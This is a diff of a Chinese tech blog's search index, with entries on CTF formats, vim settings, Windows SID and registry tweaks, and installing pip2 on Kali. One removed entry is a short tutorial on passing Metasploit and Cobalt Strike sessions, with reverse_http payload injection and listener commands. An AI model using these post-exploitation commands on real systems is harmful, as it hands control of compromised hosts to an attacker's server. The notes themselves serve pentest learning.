-<h3 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h3><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p>
-<h3 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h3><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>
-<hr>
-<p>搬迁自<a class="link"   href="https://www.wolai.com/ctfhub/mmJYyc569kAXHvfam4qont" >CTF官方指导 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>data</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux系统Tab键相关设置</title>
-    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/centos-linux/Tab%E9%94%AE%E8%AE%BE%E7%BD%AE/</url>
-    <content><![CDATA[<h3 id="Tab键相关设置"><a href="#Tab键相关设置" class="headerlink" title="Tab键相关设置"></a>Tab键相关设置</h3><h4 id="修改Tab键一次为4个空格"><a href="#修改Tab键一次为4个空格" class="headerlink" title="修改Tab键一次为4个空格"></a>修改Tab键一次为4个空格</h4><h5 id="1-仅本次"><a href="#1-仅本次" class="headerlink" title="1.仅本次"></a>1.仅本次</h5><p><strong>只在本次开打vim编辑器时生效，若重新打开vim编辑器，则失效</strong></p>
-<p>进入末行模式（ESC）<br>输入指令：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>
-
-<h5 id="2-永久"><a href="#2-永久" class="headerlink" title="2.永久"></a>2.永久</h5><p><strong>要想每次打开vim编辑器都能生效</strong>，可以编辑 Vim 的配置文件 .vimrc，并添加配置来设置 Tab 键的宽度</p>
-<p>打开.vimrc文件,若没有就手动创建一个即可</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="修改vim编辑器可查看文件行数"><a href="#修改vim编辑器可查看文件行数" class="headerlink" title="修改vim编辑器可查看文件行数"></a>修改vim编辑器可查看文件行数</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> nu</span><br></pre></td></tr></table></figure></div>
-
-<h4 id="使vim打开文件可自动缩进"><a href="#使vim打开文件可自动缩进" class="headerlink" title="使vim打开文件可自动缩进"></a>使vim打开文件可自动缩进</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> shiftwidth=4    <span class="comment">#缩进使用4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> softtabstop=4   <span class="comment">#设置tab所占的列数，当输入tab时，设为4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> expandtab       <span class="comment">#扩展tab为空格</span></span><br><span class="line"><span class="built_in">set</span> autoindent		<span class="comment">#设置自动缩进</span></span><br><span class="line"><span class="built_in">set</span> smartindent		<span class="comment">#设置智能缩进</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="vim暂时关闭缩进和注释自动缩进设置"><a href="#vim暂时关闭缩进和注释自动缩进设置" class="headerlink" title="vim暂时关闭缩进和注释自动缩进设置"></a>vim暂时关闭缩进和注释自动缩进设置</h4><p>VIM在粘贴代码时会自动缩进，把代码搞得一团糟糕，甚至可能因为某行的一个注释造成后面的代码全部被注释掉</p>
-<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle</span><br></pre></td></tr></table></figure></div>
-
-<p>即可关闭自动缩进</p>
-<p>或者设置为快捷键，最方便的方法就是在.vimrc中加一句：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle=</span><br></pre></td></tr></table></figure></div>
-
-<p>以后在插入模式下，只要按<strong>F9</strong>键就可以切换自动缩进。</p>
-<p>当需要自己手写代码的时候，进入<strong>insert模式</strong>，默认就是自动缩进了。</p>
-<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">paste</span></span><br></pre></td></tr></table></figure></div>
-
-<p>然后再进入插入模式粘贴，代码就不会被自动缩进。</p>
-<p>敲代码的时候需要自动缩进，需要改回来:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nopaste</span><br></pre></td></tr></table></figure></div>
-
+<p>先找到<code>C:\Windows\System32\Sysprep</code>路径下的<code>sysprep.exe</code>工具，双击运行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011102623.png"
+                      alt="image-20240914011102623"
+                ></p>
+<p>勾选通用，点击确定</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011117051.png"
+                      alt="image-20240914011117051"
+                ></p>
+<p>稍微等待一会，系统会重启</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011125163.png"
+                      alt="image-20240914011125163"
+                ></p>
+<p>重启之后进入到配置界面</p>
+<p>设置好密码，点击完成（密码可能要包含数字、字母、特殊符号三种才行）</p>
+<p>查看系统的SID可以在cmd命令行下，输入<code>wmic useraccount get name,sid</code>命令进行查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011313526.png"
+                      alt="image-20240914011313526"
+                ></p>
+<p>SID修改完成！</p>
 ]]></content>
       <categories>
         <category>操作系统</category>
-        <category>linux(centos)</category>
+        <category>windows</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msf与cs派生会话</title>
-    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/</url>
-    <content><![CDATA[<h1 id="msf与cs派生会话"><a href="#msf与cs派生会话" class="headerlink" title="msf与cs派生会话"></a>msf与cs派生会话</h1><h2 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h2><h3 id="在CS中做好接口监听端口的准备"><a href="#在CS中做好接口监听端口的准备" class="headerlink" title="在CS中做好接口监听端口的准备"></a>在CS中做好接口监听端口的准备</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010145920.png"
-                      alt="image-20240914010145920"
-                ></p>
-<h3 id="在MSF中添加转接exploit"><a href="#在MSF中添加转接exploit" class="headerlink" title="在MSF中添加转接exploit"></a>在MSF中添加转接exploit</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">background                // 挂起会话</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//payload各不相同，注意不要设置错了，这是32位的</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.16.181     //设置 CS 服务端的 IP 地址.</span><br><span class="line"><span class="built_in">set</span> lport 4400              //设置 CS 服务端的监听的端口</span><br><span class="line"><span class="built_in">set</span> pid xxxx	//设置程序的pid（可以不管，会自动生成一个）</span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler True</span><br><span class="line"><span class="built_in">set</span> PrependMigrate True</span><br><span class="line">sessions -l  //查看 会话 是多少则设置多少</span><br><span class="line"><span class="built_in">set</span> session 1 [一般是 1(上面查看的结果)]</span><br><span class="line">exploit      // 进行测试</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010307684.png"
-                      alt="image-20240914010307684"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914010406568.png"
-                      alt="image-20240914010406568"
-                ></p>
-<p>下面这个就是我们转接过去的beacon</p>
-<h2 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h2><h3 id="在MSF中做好接口监听端口的准备"><a href="#在MSF中做好接口监听端口的准备" class="headerlink" title="在MSF中做好接口监听端口的准备"></a>在MSF中做好接口监听端口的准备</h3><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914003204778.png"
-                      alt="image-20240914003204778"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http	//这里要设置好，协议要与下面CS的协议用一样</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.1</span><br><span class="line"><span class="built_in">set</span> lport 4445	//用于接收cs的派生会话</span><br><span class="line">run	//或者exploit</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="在CS中添加新监听"><a href="#在CS中添加新监听" class="headerlink" title="在CS中添加新监听"></a>在CS中添加新监听</h3><h4 id="添加payload为Foreign-HTTP，端口为MSF正在监听的端口"><a href="#添加payload为Foreign-HTTP，端口为MSF正在监听的端口" class="headerlink" title="添加payload为Foreign HTTP，端口为MSF正在监听的端口"></a>添加payload为Foreign HTTP，端口为MSF正在监听的端口</h4><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913230933632.png"
-                      alt="image-20240913230933632"
-                ></p>
-<h4 id="在beacon会话中运行"><a href="#在beacon会话中运行" class="headerlink" title="在beacon会话中运行"></a>在beacon会话中运行</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">spawn 监听器名</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004900523.png"
-                      alt="image-20240914004900523"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914004917729.png"
-                      alt="image-20240914004917729"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240914005102622.png"
-                      alt="image-20240914005102622"
-                ></p>
-<h4 id="或者在右键菜单中找到spawn进行派生会话"><a href="#或者在右键菜单中找到spawn进行派生会话" class="headerlink" title="或者在右键菜单中找到spawn进行派生会话"></a>或者在右键菜单中找到spawn进行派生会话</h4><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/msf%E4%B8%8Ecs%E4%BA%92%E8%BD%AC/image-20240913220809576.png"
-                      alt="image-20240913220809576"
-                ></p>
-]]></content>
-      <categories>
-        <category>操作系统</category>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
+        <tag>windows</tag>
         <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
-    <title>WriteUp</title>
-    <url>/2024/09/12/ctf/writeup/writeup/</url>
-    <content><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><p>CTF题目传送门</p>
-<ol>
-<li><a href="/2024/09/12/ctf/writeup/web/catalogue/" title="web安全目录">web安全</a></li>
-<li></li>
-<li></li>
+    <title>windows系统右键菜单栏自定义添加程序</title>
+    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/</url>
+    <content><![CDATA[<h1 id="右键菜单栏自定义添加程序"><a href="#右键菜单栏自定义添加程序" class="headerlink" title="右键菜单栏自定义添加程序"></a>右键菜单栏自定义添加程序</h1><h2 id="右键菜单栏划分"><a href="#右键菜单栏划分" class="headerlink" title="右键菜单栏划分"></a>右键菜单栏划分</h2><ol>
+<li><p>在空白处右键（桌面右键）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213332631.png"
+                      alt="image-20240913213332631"
+                ></p>
+</li>
+<li><p>在文件上右键</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213409634.png"
+                      alt="image-20240913213409634"
+                ></p>
+</li>
+<li><p>在文件夹上右键</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213440530.png"
+                      alt="image-20240913213440530"
+                ></p>
+</li>
 </ol>
-<p>推荐在线靶场传送门</p>
-<ol>
-<li><a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li></li>
-</ol>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里收录了我在做的CTF题目，题目可能来自不同靶场，会有标识的，目前还在持续更新中~</p>
-<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>本人是个大二学生，平时就是搞搞电脑，只要是和电脑有关的都感兴趣。</p>
-<p>（不怎么会自我介绍，就将就看看吧(๑◕ܫ￩๑)b ）</p>
-<p> 目前还属于CTF小白，略懂一二内网渗透。有了一点道行后听见学长们推荐写writeup来提升能力，所以就开始了我的wirteup之旅。写writeup文章时不时也会引用一些大佬的资料，希望大家能够一起共同进步，从入门到入土，或者你想从入门到入狱我也不拦你 ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;┌(;￣◇￣)┘</p>
-<blockquote>
-<p>CTF在线靶场都是在线生成的动态flag，若要复现不要直接挪用flag哦，因为你是交不了的 ≖‿≖✧</p>
-</blockquote>
-<p>话不多说，去看看有没有你心动的WP吧٩(๑´0&#96;๑)۶ </p>
+<h2 id="菜单栏对应注册表位置"><a href="#菜单栏对应注册表位置" class="headerlink" title="菜单栏对应注册表位置"></a>菜单栏对应注册表位置</h2><p>空白处右键： <code>HKEY_CLASSES_ROOT/Directory/background/shell</code></p>
+<p>文件夹右键： <code>HKEY_CLASSES_ROOT/Directory/shell</code></p>
+<p>文件上右键： <code>HKEY_CLASSES_ROOT/*/shell</code></p>
+<h2 id="添加示例"><a href="#添加示例" class="headerlink" title="添加示例"></a>添加示例</h2><p><strong>这里以在文件上右键为例</strong></p>
+<p>首先<code>win+R</code>输入<code>regedit</code>进入注册表</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213831309.png"
+                      alt="image-20240913213831309"
+                ></p>
+<p>进入文件的右键操作目录<code>HKEY_CLASSES_ROOT/*/shell</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214022631.png"
+                      alt="image-20240913214022631"
+                ></p>
+<p>右击<code>shell</code>，添加项，这个项就是你要添加的右键的文件目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214353893.png"
+                      alt="image-20240913214353893"
+                ></p>
+<p>这里示例新建一个test项，在它的默认文件里面添加数值（双击），这个值是你右键添加的名字</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214527696.png"
+                      alt="image-20240913214527696"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214650774.png"
+                      alt="image-20240913214650774"
+                ></p>
+<p>再右击test项，添加一个 <code>字符串值</code>，命名为<code>icon</code>，<strong>只能命名为这个值</strong>，添加你想要的图标**路径 + 空格 + “%1”**，例如<code>C:/test.exe &quot;%1&quot;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214827266.png"
+                      alt="image-20240913214827266"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214915488.png"
+                      alt="image-20240913214915488"
+                ></p>
+<p>最后在test项下面再添加一个项，命名为<code>command</code>，给它的默认值添加你要运行的软件的路径，如<code>C:/test.exe</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913215633160.png"
+                      alt="image-20240913215633160"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913215813847.png"
+                      alt="image-20240913215813847"
+                ></p>
+<p>到这里就自定义完成了，其他的文件夹右键等同理操作，只是初目录不一样而已</p>
+<h2 id="参考文案"><a href="#参考文案" class="headerlink" title="参考文案"></a>参考文案</h2><p><a class="link"   href="https://blog.csdn.net/Mrceel/article/details/107459678" >win10 给右键文件、文件夹、桌面菜单添加程序（项） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
       <categories>
-        <category>ctf</category>
-        <category>writeup</category>
+        <category>操作系统</category>
+        <category>windows</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
+        <tag>windows</tag>
       </tags>
   </entry>
   <entry>
@@ -687,177 +721,73 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>windows系统powershell脚本运行策略</title>
-    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/powershell%E8%BF%90%E8%A1%8C%E7%AD%96%E7%95%A5/</url>
-    <content><![CDATA[<h2 id="powershell脚本运行策略"><a href="#powershell脚本运行策略" class="headerlink" title="powershell脚本运行策略"></a>powershell脚本运行策略</h2><p><strong>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</strong></p>
-<h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ExecutionPolicy </span><br></pre></td></tr></table></figure></div>
+    <title>kali环境下的pip2安装</title>
+    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/pip2%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<h1 id="pip2安装"><a href="#pip2安装" class="headerlink" title="pip2安装"></a>pip2安装</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>有些工具需要用到python2，但又需要pip下载包，而kali并没有自带pip2命令，所以需要手动安装pip2</strong></p>
+<h2 id="1、安装setuptools-18-5（路径随便）"><a href="#1、安装setuptools-18-5（路径随便）" class="headerlink" title="1、安装setuptools-18.5（路径随便）"></a><strong>1、安装setuptools-18.5</strong>（路径随便）</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz //安装文件包</span><br><span class="line">//（可能会比较慢，可以通过物理机下载后传进去）</span><br></pre></td></tr></table></figure></div>
 
-<p><strong>Unrestricted</strong>:权限最高，可以不受限制执行任何脚本</p>
-<p>Default:为Powershell默认的策略</p>
-<p>Restricted，不允许任何脚本执行</p>
-<p>AllSigned：所有脚本都必须经过签名才能在运行</p>
-<p>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</p>
-<h3 id="改变运行策略"><a href="#改变运行策略" class="headerlink" title="改变运行策略"></a>改变运行策略</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222915609.png"
+                      alt="image-20240913222915609"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//解压文件包然后进入目录</span><br><span class="line">tar -zxvf setuptools-18.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> setuptools-18.5/</span><br></pre></td></tr></table></figure></div>
 
-]]></content>
-      <categories>
-        <category>操作系统</category>
-        <category>windows</category>
-      </categories>
-      <tags>
-        <tag>windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>windows系统修改系统SID</title>
-    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E4%BF%AE%E6%94%B9SID/</url>
-    <content><![CDATA[<h1 id="修改SID"><a href="#修改SID" class="headerlink" title="修改SID"></a>修改SID</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>修改SID一般用在windows server机器上，做内网渗透搭建域环境时需要的，因为域环境不能有SID相同的机器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222940730.png"
+                      alt="image-20240913222940730"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//用root权限安装依赖</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py build</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py install</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913223123209.png"
+                      alt="image-20240913223123209"
+                ></p>
+<h2 id="2、安装pip2"><a href="#2、安装pip2" class="headerlink" title="2、安装pip2"></a>2、安装pip2</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py	//下载pip安装py包（可能会比较慢，可以通过物理机下载后传进去）</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py  </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224726285.png"
+                      alt="image-20240913224726285"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224913728.png"
+                      alt="image-20240913224913728"
+                ></p>
+<p><strong>此时可能会有报错，报错需要安装python2-dev（kali源已经更新的条件下）</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install python2-dev</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>此时再执行<code>python2 get-pip.py</code>，就会继续安装</strong></p>
+<p><strong>安装过程中会有读取超时的报错则需反复多试几次则可成功运行</strong></p>
 <blockquote>
-<p><strong>注意：用sysprep修改SID之后，系统会自动重启，之前配置好的网络、修改过的机器名会重置。所以，该操作需要在配置网络、修改机器名之前进行操作。</strong></p>
+<p>猜测是访问网络问题导致超时</p>
 </blockquote>
-<p>先找到<code>C:\Windows\System32\Sysprep</code>路径下的<code>sysprep.exe</code>工具，双击运行</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011102623.png"
-                      alt="image-20240914011102623"
-                ></p>
-<p>勾选通用，点击确定</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011117051.png"
-                      alt="image-20240914011117051"
-                ></p>
-<p>稍微等待一会，系统会重启</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011125163.png"
-                      alt="image-20240914011125163"
-                ></p>
-<p>重启之后进入到配置界面</p>
-<p>设置好密码，点击完成（密码可能要包含数字、字母、特殊符号三种才行）</p>
-<p>查看系统的SID可以在cmd命令行下，输入<code>wmic useraccount get name,sid</code>命令进行查看</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011313526.png"
-                      alt="image-20240914011313526"
-                ></p>
-<p>SID修改完成！</p>
+<h2 id="3、使用pip2安装模块"><a href="#3、使用pip2安装模块" class="headerlink" title="3、使用pip2安装模块"></a>3、使用pip2安装模块</h2><p>更换pip源（不安装源，反复执行也行，但速度非常慢，安装后运行速度会大大提升）</p>
+<p>pip更新阿里云快速下载：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure></div>
+
+<p>pip更新清华源快速下载：</p>
